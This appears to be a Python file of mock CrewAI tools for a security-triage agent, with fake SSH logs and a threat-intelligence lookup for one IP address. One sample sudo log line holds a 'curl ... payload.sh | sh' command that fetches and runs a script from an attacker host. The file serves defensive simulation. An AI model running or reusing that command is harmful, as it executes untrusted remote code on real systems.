from crewai.tools import tool


MOCK_LOGS = {
    "185.220.101.45": [
        "02:11:04Z auth.log: 42 failed SSH logins for user 'deploy_bot' from 185.220.101.45",
        "02:14:19Z auth.log: Accepted publickey for 'deploy_bot' from 185.220.101.45",
        "02:15:02Z sudo: deploy_bot executed '/bin/bash -c curl http://185.220.101.45/payload.sh | sh' on prod-app-01",
    ],
    "10.0.4.18": [
        "09:00:01Z cron: scheduled healthcheck ran on staging-db-01 from 10.0.4.18 (HTTP 200)",
    ],
}

KNOWN_MALICIOUS_IPS = {
    "185.220.101.45": {
        "reputation": "High Risk / Known Malicious Infrastructure",
        "mitre": ["T1110 (Brute Force)", "T1059.004 (Unix Shell)", "T1105 (Ingress Tool Transfer)"],
        "notes": "Associated with automated credential stuffing and post-exploitation script staging.",
    }
}


@tool("Search Security Logs")
def search_security_logs(query_key: str) -> str:
    """Searches authentication, sudo, and system logs by IP address, hostname, or username."""
    key = query_key.strip()
    for k, entries in MOCK_LOGS.items():
        if key in k or any(key in entry for entry in entries):
            return "\n".join(entries)
    return f"No matching forensic log entries found for '{key}'."


@tool("Lookup Threat Intelligence")
def lookup_threat_intel(indicator: str) -> str:
    """Checks an IP address, domain, or hash against threat intelligence feeds and MITRE ATT&CK."""
    ind = indicator.strip()
    if ind in KNOWN_MALICIOUS_IPS:
        info = KNOWN_MALICIOUS_IPS[ind]
        return (
            f"Indicator: {ind}\n"
            f"Reputation: {info['reputation']}\n"
            f"MITRE ATT&CK: {', '.join(info['mitre'])}\n"
            f"Notes: {info['notes']}"
        )
    return f"Indicator '{ind}' has no known malicious threat intel hits."